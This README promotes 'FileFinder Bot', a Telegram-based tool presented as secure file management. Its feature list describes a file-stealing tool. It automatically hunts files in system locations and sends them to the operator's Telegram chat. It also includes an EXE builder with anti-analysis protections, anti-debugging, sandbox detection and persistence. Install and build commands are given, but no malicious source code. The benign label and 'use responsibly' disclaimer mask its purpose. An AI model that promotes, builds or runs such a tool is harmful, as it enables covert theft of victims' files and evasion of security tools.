# FileFinder Bot

🔍 A secure Telegram-based file management system with automated discovery and delivery capabilities

![Demo](https://via.placeholder.com/800x400.png?text=FileFinder+Demo)

## Features
- 🚀 Automated file discovery in key system locations
- 🔒 End-to-end encryption using Fernet (AES-128)
- 📦 EXE builder with anti-analysis protections
- 📊 Health monitoring and system reporting
- ⚡ Asynchronous operations for high performance

## Installation
```bash
git clone https://github.com/yourusername/file-finder.git
cd file-finder
pip install -r requirements.txt
```

## Configuration
1. Get your Telegram bot token from [@BotFather](https://t.me/BotFather)
2. Update credentials in `file_finder.py`:
```python
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
```

## Usage
```bash
# Run directly
python file_finder.py

# Build executable
python build_exe.py
```

## Security Notes
- 🔑 Encryption key auto-generated at build time
- 🛡️ Anti-debugging and sandbox detection
- 📛 Persistence mechanism (use with caution)

## License
MIT License | Use responsibly under ethical guidelines
